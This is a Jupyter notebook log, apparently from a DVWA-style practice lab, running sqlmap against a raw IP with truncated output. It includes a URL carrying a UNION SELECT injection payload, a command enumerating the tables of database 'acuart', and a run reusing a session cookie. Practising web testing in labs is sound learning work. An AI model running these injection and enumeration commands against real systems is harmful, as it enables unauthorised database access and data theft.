# %%
# %%bash
# sudo sqlmap -h
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.5#stable}
# |_ -| . [.]     | .'| . |
# |___|_  [,]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# Usage: python3 sqlmap [options]
#
# Options:
#   -h, --help            Show basic help message and exit
#   -hh                   Show advanced help message and exit
#   --version             Show program's version number and exit
#   -v VERBOSE            Verbosity level: 0-6 (default 1)
#
#   Target:
#     At least one of these options has to be provided to define the
#     target(s)
#
#     -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
#     -g GOOGLEDORK       Process Google dork results as target URLs
#
#   Request:
#     These options can be used to specify how to connect to the target URL
#
#     --data=DATA         Data string to be sent through POST (e.g. "id=1")
#     --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
# ...

# %%
# %%bash
# sudo sqlmap -u "http://139.180.153.83/vulnerabilities/sqli/?id=%3Fid%3Da%27+UNION+SELECT+%22text1%22%2C%22text2%22%3B--+-%26Submit%3DSubmit&Submit=Submit#"
# Out:
#         ___
#        __H__
#  ___ ___["]_____ ___ ___  {1.5#stable}
# |_ -| . [']     | .'| . |
# |___|_  [,]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 16:34:14 /2021-01-15/
#
# >[16:34:14] [INFO] using 'STDIN' for parsing targets list
# URL 1:
# GET http://139.180.153.83/vulnerabilities/sqli/?id=%3Fid%3Da%27+UNION+SELECT+%22text1%22%2C%22text2%22%3B--+-%26Submit%3DSubmit&Submit=Submit#
# do you want to test this URL? [Y/n/q]
# > Y
# [16:34:14] [INFO] testing URL 'http://139.180.153.83/vulnerabilities/sqli/?id=%3Fid%3Da%27+UNION+SELECT+%22text1%22%2C%22text2%22%3B--+-%26Submit%3DSubmit&Submit=Submit#'
# ...

# %%
# %%bash
# sqlmap -u http://139.180.153.83/vulnerabilities/sqli/?id=2 -D acuart --tables
# Out:
#         ___
#        __H__
#  ___ ___[)]_____ ___ ___  {1.5#stable}
# |_ -| . [)]     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 16:27:51 /2021-01-15/
#
# >[16:27:51] [INFO] using 'STDIN' for parsing targets list
# URL 1:
# GET http://139.180.153.83/vulnerabilities/sqli/?id=2
# do you want to test this URL? [Y/n/q]
# > Y
# [16:27:51] [INFO] testing URL 'http://139.180.153.83/vulnerabilities/sqli/?id=2'
# [16:27:51] [INFO] using '/home/jupyter/.local/share/sqlmap/output/results-01152021_0427pm.csv' as the CSV results file in multiple targets mode
# [16:27:51] [INFO] testing connection to the target URL
# ...

# %%
# %%bash
# sqlmap -u 'http://139.180.153.83/vulnerabilities/sqli/?id=1&Submit=Submit#'
# --cookie="security=low; PHPSESSID=7j2t23ebotuu850fmik6ckqhe5"
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.5#stable}
# |_ -| . [)]     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 09:24:11 /2021-01-17/
#
# >[09:24:11] [INFO] using 'STDIN' for parsing targets list
#
# [*] ending @ 09:24:11 /2021-01-17/

# %%
# %%bash
